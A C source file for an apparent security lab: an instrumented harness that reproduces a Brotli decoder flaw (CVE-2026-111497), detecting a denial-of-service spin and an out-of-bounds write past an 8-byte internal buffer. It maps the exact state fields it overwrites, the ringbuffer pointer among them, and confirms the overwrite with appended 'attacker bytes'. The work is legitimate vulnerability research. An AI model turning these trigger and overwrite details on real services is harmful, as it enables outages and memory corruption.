/* Instrumented ASAN harness for the Brotli decoder — CVE-2026-111497 lab.
 *
 * Why this exists
 * ---------------
 * The vulnerable behaviour is NOT a crash you can see from outside: the decoder
 * returns BROTLI_DECODER_RESULT_NEEDS_MORE_INPUT and a calling stream keeps
 * handing it data. Two failure modes have to be told apart, and neither shows up
 * in the return code alone:
 *
 *   (a) SPIN      the decoder never returns -- the unsafe decode loop re-enters
 *                 the invalid block switch forever while input is still buffered
 *                 (decode.c:1988 CheckInputAmount keeps passing). Caller sees
 *                 100% CPU and a hung service: the "DoS" everyone reported.
 *   (b) OOB WRITE the decoder DOES return NEEDS_MORE_INPUT, and
 *                 BrotliDecoderDecompressStream() stashes the unconsumed input in
 *                 the 8-byte `s->buffer.u8[8]` field. Both stash loops assume the
 *                 decoder eventually consumes the buffer:
 *                   decode.c:2463-2468  copies the whole unconsumed tail
 *                   decode.c:2444-2455  appends ONE byte per retry, guarded only
 *                                       by BROTLI_DCHECK(buffer_length < 8)
 *                 With no progress, buffer_length runs past 8 and the input bytes
 *                 are written into the fields after the union -- `buffer_length`
 *                 itself, then pos / max_distance / ringbuffer_size /
 *                 ringbuffer_mask / dist_rb[] / meta_block_remaining_len and
 *                 finally the `uint8_t* ringbuffer` pointer.
 *
 * The write is inside one allocation, so ASAN and valgrind do NOT report it.
 * Detection is therefore structural: this harness compiles against the vendor's
 * own internal `c/dec/state.h`, prints the real field offsets, and watches the
 * invariant the vendor only asserts in debug builds.
 *
 * Self-verdicting by design: the verdict is derived from the *observed* error
 * code / state, not from which library version was linked.
 *
 * Exit codes: 0 decoded | 2 format error | 3 spin/OOB | 4 needs more input
 */
#define _GNU_SOURCE
#include <brotli/decode.h>
#include <stddef.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* Vendored internal header, compiled from source in this lab. */
#include "state.h"

typedef struct BrotliDecoderStateStruct State;

#define OUT_CAP (1u << 20)
#define MAX_ITER 4000000
#define WATCHDOG_SECONDS 10

static void on_alarm(int sig) {
  (void)sig;
  static const char msg[] =
      "VERDICT=NO_PROGRESS_SPIN\n"
      "detail=decoder did not return from a single BrotliDecoderDecompressStream() call\n"
      "detail=caller would keep feeding input forever; service burns CPU instead of crashing\n"
      ">>> TRIGGERED: invalid block switch reported as needs-more-input (DoS arm) <<<\n"
      "exit=3\n";
  ssize_t n = write(STDOUT_FILENO, msg, sizeof(msg) - 1);
  (void)n;
  _exit(3);
}

static void print_layout(void) {
  printf("state_layout:\n");
  printf("  offsetof(buffer)                    = %zu  (uint8_t u8[8])\n",
         offsetof(State, buffer));
  printf("  offsetof(buffer_length)             = %zu\n", offsetof(State, buffer_length));
  printf("  offsetof(pos)                       = %zu\n", offsetof(State, pos));
  printf("  offsetof(max_distance)              = %zu\n", offsetof(State, max_distance));
  printf("  offsetof(ringbuffer_size)           = %zu\n", offsetof(State, ringbuffer_size));
  printf("  offsetof(ringbuffer_mask)           = %zu\n", offsetof(State, ringbuffer_mask));
  printf("  offsetof(dist_rb)                   = %zu\n", offsetof(State, dist_rb));
  printf("  offsetof(meta_block_remaining_len)  = %zu\n", offsetof(State, meta_block_remaining_len));
  printf("  offsetof(ringbuffer)                = %zu  (uint8_t*)\n", offsetof(State, ringbuffer));
  printf("  offsetof(ringbuffer_end)            = %zu  (uint8_t*)\n", offsetof(State, ringbuffer_end));
  printf("  sizeof(state)                       = %zu\n", sizeof(State));
  printf("  input byte index i lands at state offset %zu + i\n", offsetof(State, buffer));
}

static const char* code_name(int c) {
  const char* s = BrotliDecoderErrorString((BrotliDecoderErrorCode)c);
  return s ? s : "(no string)";
}

/* decode.h v1.2.0: "/* -17 code is reserved *\/"
   decode.h v1.2.1: BROTLI_ERROR_CODE(_ERROR_FORMAT_, BLOCK_SWITCH, -17)
   Enumerators are not preprocessor macros, so the value is spelled numerically;
   v1.2.1 gives this exact value to BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH. */
#define LAB_BLOCK_SWITCH_CODE (-17)

static void dump_state(const char* tag, State* st) {
  printf("state[%s]: buffer_length=%llu pos=%d max_distance=%d ringbuffer_size=%d "
         "mask=%d mlr=%d error_code=%d ringbuffer=%p\n",
         tag,
         (unsigned long long)st->buffer_length, st->pos, st->max_distance,
         st->ringbuffer_size, st->ringbuffer_mask, st->meta_block_remaining_len,
         st->error_code, (void*)st->ringbuffer);
}

static size_t LAB_PHASE2_BYTES = 0;   /* --phase2-bytes N */
static size_t LEFT_PER_CALL = 1;     /* --phase2-per-call N: bytes handed over per call */
static int LAB_WALK[1] = {0};        /* --walk: follow the append walk to the ceiling */

static void dump_clobber(State* st) {
  printf("  clobber_check (attacker bytes start at state offset %zu):\n", offsetof(State, buffer));
  printf("    buffer_length = %llu (0x%llx)\n", (unsigned long long)st->buffer_length,
         (unsigned long long)st->buffer_length);
  printf("    pos = %d  max_distance = %d  ringbuffer_size = %d  ringbuffer_mask = %d\n",
         st->pos, st->max_distance, st->ringbuffer_size, st->ringbuffer_mask);
  printf("    meta_block_remaining_len = %d  error_code = %d\n", st->meta_block_remaining_len,
         st->error_code);
  printf("    ringbuffer     = %p   (state offset %zu)\n", (void*)st->ringbuffer,
         offsetof(State, ringbuffer));
  printf("    ringbuffer_end = %p   (state offset %zu)\n", (void*)st->ringbuffer_end,
         offsetof(State, ringbuffer_end));
  printf("    htree_command  = %p   (state offset %zu)\n", (void*)st->htree_command,
         offsetof(State, htree_command));
}

static void emit_transaction_verdict(BrotliDecoderResult r, State* st, int rc) {
  int c = (int)BrotliDecoderGetErrorCode(st);
#if 1
  if (c == LAB_BLOCK_SWITCH_CODE) {
    printf("VERDICT=FORMAT_ERROR error_code=%d (%s)\n", c, code_name(c));
    printf(">>> NOT TRIGGERED (patched build): invalid block switch reported as a "
           "permanent format error, not as needs-more-input <<<\n");
    printf("exit=%d\n", rc);
    return;
  }
#endif
  if (r == BROTLI_DECODER_RESULT_ERROR) {
    printf("VERDICT=FORMAT_ERROR error_code=%d (%s)\n", c, code_name(c));
    printf(">>> NOT TRIGGERED (rejected for another reason) <<<\n");
    printf("exit=%d\n", rc);
    return;
  }
  if (r == BROTLI_DECODER_RESULT_NEEDS_MORE_INPUT) {
    printf("VERDICT=NEEDS_MORE_INPUT error_code=%d (%s)\n", c, code_name(c));
    printf(">>> TRIGGERED: decoder demanding input it cannot consume <<<\n");
    printf("exit=%d\n", rc);
    return;
  }
  printf("VERDICT=OTHER result=%d\n", (int)r);
  printf("exit=%d\n", rc);
}

static uint8_t* read_file(const char* path, size_t* out_len) {
  FILE* f = fopen(path, "rb");
  if (!f) { perror(path); return NULL; }
  fseek(f, 0, SEEK_END);
  long n = ftell(f);
  fseek(f, 0, SEEK_SET);
  uint8_t* buf = (uint8_t*)malloc((size_t)n ? (size_t)n : 1);
  if (fread(buf, 1, (size_t)n, f) != (size_t)n) { perror("read"); fclose(f); return NULL; }
  fclose(f);
  *out_len = (size_t)n;
  return buf;
}

/* ---------------------------------------------------------------- modes -- */

/* Generic: feed the payload in fixed-size chunks, report what the library did. */
static int run_stream(const uint8_t* in, size_t in_len, size_t chunk, int watch) {
  BrotliDecoderState* s = BrotliDecoderCreateInstance(NULL, NULL, NULL);
  if (!s) { fprintf(stderr, "BrotliDecoderCreateInstance failed\n"); return 1; }
  State* st = (State*)s;
  uint8_t* out = (uint8_t*)malloc(OUT_CAP);
  const uint8_t* next_in = in;
  size_t avail_in = 0, cursor = 0, fed = 0;
  unsigned long long total_out = 0;
  BrotliDecoderResult r = BROTLI_DECODER_RESULT_NEEDS_MORE_INPUT;
  unsigned iter;
  int rc = 4;

  for (iter = 0; iter < MAX_ITER; ++iter) {
    if (avail_in == 0 && cursor < in_len) {
      size_t take = in_len - cursor;
      if (chunk && take > chunk) take = chunk;
      next_in = in + cursor;
      avail_in = take;
      cursor += take;
      fed += take;
    }
    uint8_t* next_out = out;
    size_t avail_out = OUT_CAP;
    size_t out_before = avail_out, in_before = avail_in;
    r = BrotliDecoderDecompressStream(s, &avail_in, &next_in, &avail_out, &next_out, NULL);
    total_out += (unsigned long long)(out_before - avail_out);
    if (watch) dump_state("after-call", st);

    if (st->buffer_length > 8) {
      printf("mode=stream chunk=%zu iter=%u fed=%zu out_bytes=%llu\n",
             chunk, iter, fed, total_out);
      printf("VERDICT=OOB_WRITE_PAST_8_BYTE_BUFFER buffer_length=%llu (> 8)\n",
             (unsigned long long)st->buffer_length);
      printf(">>> TRIGGERED: input written at s->buffer.u8[8..] -- past the 8-byte "
             "internal buffer, into adjacent decoder state <<<\n");
      rc = 3;
      break;
    }
    if (r == BROTLI_DECODER_RESULT_SUCCESS) {
      printf("mode=stream chunk=%zu iter=%u fed=%zu out_bytes=%llu\n",
             chunk, iter, fed, total_out);
      printf("VERDICT=DECODED\n>>> NOT TRIGGERED (stream accepted) <<<\nexit=0\n");
      rc = 0;
      break;
    }
    if (r == BROTLI_DECODER_RESULT_ERROR) {
      printf("mode=stream chunk=%zu iter=%u fed=%zu out_bytes=%llu\n",
             chunk, iter, fed, total_out);
      emit_transaction_verdict(r, st, 2);
      rc = 2;
      break;
    }
    if (r == BROTLI_DECODER_RESULT_NEEDS_MORE_INPUT && cursor >= in_len && avail_in == 0) {
      printf("mode=stream chunk=%zu iter=%u fed=%zu out_bytes=%llu\n",
             chunk, iter, fed, total_out);
      emit_transaction_verdict(r, st, 4);
      rc = 4;
      break;
    }
    /* no-progress: nothing consumed, nothing produced */
    if (avail_in == in_before && avail_out == out_before &&
        r == BROTLI_DECODER_RESULT_NEEDS_MORE_INPUT && avail_in == 0) {
      r = BROTLI_DECODER_RESULT_NEEDS_MORE_INPUT;
    }
  }
  if (iter == MAX_ITER) {
    printf("VERDICT=ITERATION_CAP\n>>> TRIGGERED: no terminal state after %d calls <<<\nexit=3\n",
           MAX_ITER);
    rc = 3;
  }
  BrotliDecoderDestroyInstance(s);
  free(out);
  return rc;
}

/* Probe: deliver the trigger, observe the stash, then add exactly the number of
   attacker bytes needed to cross the 8-byte boundary, and predict the exact
   resulting buffer_length value. */
static int run_probe(const uint8_t* in, size_t in_len, int watch) {
  BrotliDecoderState* s = BrotliDecoderCreateInstance(NULL, NULL, NULL);
  if (!s) { fprintf(stderr, "BrotliDecoderCreateInstance failed\n"); return 1; }
  State* st = (State*)s;
  uint8_t* out = (uint8_t*)malloc(OUT_CAP);
  const uint8_t* next_in = in;
  size_t avail_in = in_len;
  unsigned long long total_out = 0;

  /* --- phase 1: the whole payload as one chunk (a caller's first chunk) --- */
  for (int i = 0; i < 4096; ++i) {
    uint8_t* next_out = out;
    size_t avail_out = OUT_CAP, out_before = avail_out;
    BrotliDecoderResult r =
        BrotliDecoderDecompressStream(s, &avail_in, &next_in, &avail_out, &next_out, NULL);
    total_out += (unsigned long long)(out_before - avail_out);
    printf("phase1 call=%d result=%d avail_in_left=%zu out_bytes=%llu buffer_length=%llu\n",
           i, (int)r, avail_in, total_out, (unsigned long long)st->buffer_length);
    if (st->buffer_length > 8) {
      if (watch) dump_state("phase1-oob", st);
      dump_clobber(st);
      printf("VERDICT=OOB_WRITE_PAST_8_BYTE_BUFFER buffer_length=%llu (> 8, from the tail copy "
             "at decode.c:2463-2468)\n", (unsigned long long)st->buffer_length);
      printf(">>> TRIGGERED on the FIRST chunk: %llu input byte(s) written from "
             "s->buffer.u8[0] onward, i.e. %llu past the 8-byte buffer <<<\nexit=3\n",
             (unsigned long long)st->buffer_length,
             (unsigned long long)st->buffer_length - 8);
      BrotliDecoderDestroyInstance(s);
      free(out);
      return 3;
    }
    if (r == BROTLI_DECODER_RESULT_NEEDS_MORE_OUTPUT) continue;   /* drain the ring buffer */
    if (r == BROTLI_DECODER_RESULT_ERROR || r == BROTLI_DECODER_RESULT_SUCCESS) {
      if (watch) dump_state("phase1-end", st);
      emit_transaction_verdict(r, st, r == BROTLI_DECODER_RESULT_ERROR ? 2 : 4);
      BrotliDecoderDestroyInstance(s);
      free(out);
      return r == BROTLI_DECODER_RESULT_ERROR ? 2 : 4;
    }
    break;   /* NEEDS_MORE_INPUT: the stall being hunted */
  }

  printf("phase1_state: buffer_length=%llu\n", (unsigned long long)st->buffer_length);
  if (st->buffer_length > 8) {
    printf("VERDICT=OOB_WRITE_PAST_8_BYTE_BUFFER buffer_length=%llu (> 8, from the tail copy)\n",
           (unsigned long long)st->buffer_length);
    printf(">>> TRIGGERED on the FIRST chunk <<<\nexit=3\n");
    BrotliDecoderDestroyInstance(s);
    free(out);
    return 3;
  }
  if (st->buffer_length == 0) {
    printf("VERDICT=NO_STASH nothing was buffered; the OOB arm needs a chunk that ends "
           "mid-transaction\n>>> NOT TRIGGERED (this arm) <<<\nexit=4\n");
    BrotliDecoderDestroyInstance(s);
    free(out);
    return 4;
  }

  /* --- phase 2: append bytes; each write lands at s->buffer.u8[buffer_length] --- */
  size_t need = LAB_PHASE2_BYTES ? (size_t)LAB_PHASE2_BYTES
                                 : (st->buffer_length < 9 ? 9 - (size_t)st->buffer_length : 1);
  uint8_t* extra = (uint8_t*)malloc(need);
  memset(extra, 0x41, need);
  printf("phase2: buffer_length=%llu so %zu further byte(s) of 0x41 reach u8[8]; "
         "prediction: buffer_length becomes 0x42 (clobbered low byte 0x41, then ++)\n",
         (unsigned long long)st->buffer_length, need);

  const uint8_t* p = extra;
  size_t left = need;
  for (int i = 0; i < 64; ++i) {
    size_t this_call = LEFT_PER_CALL && left > LEFT_PER_CALL ? LEFT_PER_CALL : left;
    uint8_t* next_out = out;
    size_t avail_out = OUT_CAP, out_before = avail_out;
    size_t in_before = left;
    size_t chunk = this_call;
    BrotliDecoderResult r = BrotliDecoderDecompressStream(s, &chunk, &p, &avail_out, &next_out, NULL);
    left -= chunk;
    total_out += (unsigned long long)(out_before - avail_out);
    unsigned long long bl = (unsigned long long)st->buffer_length;
    printf("phase2 call=%d result=%d fed_now=%zu avail_in_left=%zu buffer_length=%llu (0x%llx) pos=%d ringbuf=%p\n",
           i, (int)r, in_before - left, left, bl, bl, st->pos, (void*)st->ringbuffer);
    if (watch) dump_state("phase2", st);
    if (bl > 8 && !LAB_WALK[0]) {
      printf("VERDICT=OOB_WRITE_PAST_8_BYTE_BUFFER buffer_length=%llu (0x%llx)\n", bl, bl);
      dump_clobber(st);
      if (bl == 0x42) {
        printf("prediction=CONFIRMED exactly 0x42 -- one attacker byte wrote at "
               "s->buffer.u8[8], the first byte of the buffer_length field\n");
      }
      printf(">>> TRIGGERED: out-of-bounds write past the 8-byte internal buffer, into "
             "adjacent decoder state <<<\nexit=3\n");
      BrotliDecoderDestroyInstance(s);
      free(out);
      free(extra);
      return 3;
    }
    if (LAB_WALK[0] && bl >= 28) {
      printf("CEILING: buffer_length reached %llu (>= 28 == BROTLI_FAST_INPUT_SLACK); "
             "BrotliBitReaderSetInput() now arms the fast path and the drained state spins.\n", bl);
      break;
    }
    if (left == 0) break;
  }
  printf("VERDICT=NO_OBSERVED_OOB buffer_length=%llu\n>>> NOT TRIGGERED <<<\nexit=4\n",
         (unsigned long long)st->buffer_length);
  BrotliDecoderDestroyInstance(s);
  free(out);
  free(extra);
  return 4;
}

int main(int argc, char** argv) {
  const char* mode = "probe";
  size_t chunk = 0;
  int watch = 0;
  unsigned wd = WATCHDOG_SECONDS;
  const char* path = NULL;

  for (int i = 1; i < argc; ++i) {
    if (!strcmp(argv[i], "--mode") && i + 1 < argc) mode = argv[++i];
    else if (!strcmp(argv[i], "--chunk") && i + 1 < argc) chunk = (size_t)strtoul(argv[++i], NULL, 0);
    else if (!strcmp(argv[i], "--watch")) watch = 1;
    else if (!strcmp(argv[i], "--watchdog") && i + 1 < argc) wd = (unsigned)strtoul(argv[++i], NULL, 0);
    else if (!strcmp(argv[i], "--phase2-bytes") && i + 1 < argc) LAB_PHASE2_BYTES = (size_t)strtoul(argv[++i], NULL, 0);
    else if (!strcmp(argv[i], "--phase2-per-call") && i + 1 < argc) LEFT_PER_CALL = (size_t)strtoul(argv[++i], NULL, 0);
    else if (!strcmp(argv[i], "--walk")) { LAB_WALK[0] = 1; LEFT_PER_CALL = 1; }
    else if (!strcmp(argv[i], "--layout")) { print_layout(); return 0; }
    else path = argv[i];
  }
  if (!path) {
    fprintf(stderr, "usage: %s [--mode probe|stream] [--chunk N] [--watch] FILE\n", argv[0]);
    return 1;
  }

  size_t len = 0;
  uint8_t* buf = read_file(path, &len);
  if (!buf) return 1;

  signal(SIGALRM, on_alarm);
  if (wd) alarm(wd);

  printf("input=%s bytes=%zu brotli=0x%08x report=%s\n", path, len,
         (unsigned)BrotliDecoderVersion(),
         (unsigned)BrotliDecoderVersion() >= 0x01002001u
             ? "1.2.1+ (FORMAT_BLOCK_SWITCH exists)"
             : "1.2.0 (block-switch error code still reserved, no such enum)");
  print_layout();

  int rc = !strcmp(mode, "stream") ? run_stream(buf, len, chunk, watch) : run_probe(buf, len, watch);
  alarm(0);  (void)wd;
  free(buf);
  return rc;
}
